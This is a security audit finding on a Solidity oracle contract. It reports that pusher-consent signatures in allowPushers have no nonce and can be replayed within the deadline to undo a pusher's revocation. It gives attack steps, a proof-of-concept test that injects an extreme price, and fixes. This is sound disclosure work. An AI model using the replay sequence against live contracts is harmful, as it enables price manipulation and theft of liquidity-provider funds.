### Title
Pusher consent signature is replayable within the deadline window, allowing a creator to silently re-establish a revoked delegation and sustain bad-price injection — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` signs pusher consent over `(chainid, address(this), deadline, pusher, creator)` with no nonce and no used-signature flag. After a pusher calls `revokePusher()`, the creator can replay the original consent bytes verbatim — as many times as desired — until the deadline expires. If the pusher's key is compromised, the pusher's self-revocation is silently undone by the creator (who may be unaware of the compromise), leaving the attacker's key continuously authorized to write into the creator's namespace and feed bad prices to pools.

---

### Finding Description

The signed message in `allowPushers` is:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));

namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no per-signature consumed mapping, and no monotonic counter. The same `(deadline, pusher, creator)` tuple produces an identical hash on every call. The function's own inline comment acknowledges the replay risk but only addresses the post-deadline case:

> *"an undated signature could re-establish a delegation AFTER the pusher revoked it"* [2](#0-1) 

Within the deadline window the same bytes are accepted on every invocation. `revokePusher` clears `namespaceRemapping[pusher]` to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But nothing prevents the creator from immediately calling `allowPushers` again with the identical signature bytes, restoring `namespaceRemapping[pusher] = creator`. The cycle can repeat for the entire deadline window (which callers routinely set to days or weeks).

**Attack sequence:**

1. Pusher signs consent for creator with `deadline = now + 30 days`.
2. Creator calls `allowPushers` → `namespaceRemapping[pusher] = creator`.
3. Pusher's private key is compromised; pusher calls `revokePusher()` → `namespaceRemapping[pusher] = 0`.
4. Creator (unaware of the compromise) calls `allowPushers` with the same signature → `namespaceRemapping[pusher] = creator` (re-established).
5. Attacker holding the compromised key calls the oracle's `fallback` push path; namespace resolution maps the push into the creator's namespace.
6. The creator's price provider reads the corrupted feed and delivers a bad bid/ask to the pool's `swap`.

The fallback push path resolves the namespace as:

```solidity
address ns = namespaceRemapping[msg.sender];
if (ns == address(0)) ns = msg.sender;
``` [4](#0-3) 

So as long as the delegation is active, every push from the compromised key lands in the creator's namespace and is consumed by the price provider.

---

### Impact Explanation

A compromised pusher key that has been self-revoked can be silently re-authorized by the creator replaying the old signature. The attacker then pushes arbitrary `U64x32`-encoded prices into the creator's namespace. The price provider reads those values and delivers a stale, inverted, or unbounded bid/ask to `MetricOmmPool.swap`, causing swap conservation failure or direct loss of LP assets. This matches the allowed impact gate: **bad-price execution** and **pool insolvency**.

---

### Likelihood Explanation

Medium. The precondition is a compromised pusher key plus a creator who replays the old signature without knowing about the compromise. Deadline windows are caller-controlled and commonly set to days or weeks (as shown in tests using `block.timestamp + 1 days`), giving the attacker a sustained window. [5](#0-4) 

---

### Recommendation

Add a per-pusher nonce or a consumed-signature mapping to `allowPushers`:

```solidity
mapping(bytes32 => bool) public usedDelegationSignatures;

// inside allowPushers loop:
bytes32 sigHash = keccak256(signatures[i]);
require(!usedDelegationSignatures[sigHash], "signature already used");
usedDelegationSignatures[sigHash] = true;
```

Alternatively, include a per-pusher nonce in the signed message so that each revocation increments the nonce and invalidates all prior signatures:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]++))
```

### Proof of Concept

```solidity
// Setup: pusher signs consent for creator, deadline = now + 30 days
uint256 deadline = block.timestamp + 30 days;
bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
);
bytes memory sig = sign(PUSHER_KEY, digest);

// Step 1: creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator);

// Step 2: pusher's key is compromised; pusher self-revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // cleared

// Step 3: creator replays the SAME signature — delegation re-established
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig)); // no revert
assertEq(oracle.namespaceRemapping(pusher), creator);   // ← re-established

// Step 4: attacker pushes bad price using compromised key
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 badRaw = _packRaw(999_999_999, 0, 0); // extreme price
vm.prank(pusher); // attacker holds this key
(bool ok,) = address(oracle).call(_wordAt(0, 0, badRaw, tsMs));
assertTrue(ok);

// Bad price now lives in creator's namespace, consumed by price provider → pool
IOffchainOracle.OracleData memory d = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertEq(d.price, U64x32.decode(uint32(badRaw >> 16))); // corrupted
```

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
